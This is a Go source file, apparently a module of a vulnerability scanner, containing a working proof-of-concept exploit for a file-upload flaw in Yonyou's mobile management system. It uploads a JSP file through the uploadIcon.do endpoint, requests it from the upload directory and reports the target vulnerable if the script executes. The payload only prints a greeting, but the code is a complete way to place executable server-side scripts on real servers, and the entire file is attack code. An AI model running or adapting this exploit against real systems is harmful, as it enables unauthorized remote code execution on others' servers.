package Youyon_uploadIcon_do_upload

import (
	"bytes"
	"github.com/gookit/color"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"strings"
	"time"
)

func Run(url string) {
	uploadUrl := url + "/maportal/appmanager/uploadIcon.do"
	checkUrl := url + "/maupload/img/test.jsp"

	// 创建一个buffer，并用它来写入multipart表单数据
	var b bytes.Buffer
	w := multipart.NewWriter(&b)
	fw, err := w.CreateFormFile("iconFile", "test.jsp")
	if err != nil {
		color.Red.Println("[-] 创建表单数据失败")
		return
	}
	_, err = fw.Write([]byte(`<% out.println("Hello, World!"); %>`))
	if err != nil {
		color.Red.Println("[-] 写入表单数据失败")
		return
	}
	w.Close()

	// 发送上传请求
	req, err := http.NewRequest("POST", uploadUrl, &b)
	if err != nil {
		color.Red.Println("[-] 创建请求失败")
		return
	}

	req.Header.Set("Content-Type", w.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0")
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		color.Red.Println("[-] 发送上传请求失败")
		return
	}
	defer resp.Body.Close()

	// 检查上传的文件是否存在
	resp, err = http.Get(checkUrl)
	if err != nil {
		color.Red.Println("[-] 用友移动管理系统uploadIcon.do文件上传漏洞不存在")
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red.Println("[-] 读取响应体失败")
		return
	}

	if resp.StatusCode == 200 && strings.Contains(string(body), "Hello, World!") {
		color.Green.Println("[+] 用友移动管理系统uploadIcon.do文件上传漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-] 用友移动管理系统uploadIcon.do文件上传漏洞不存在")
	}
}
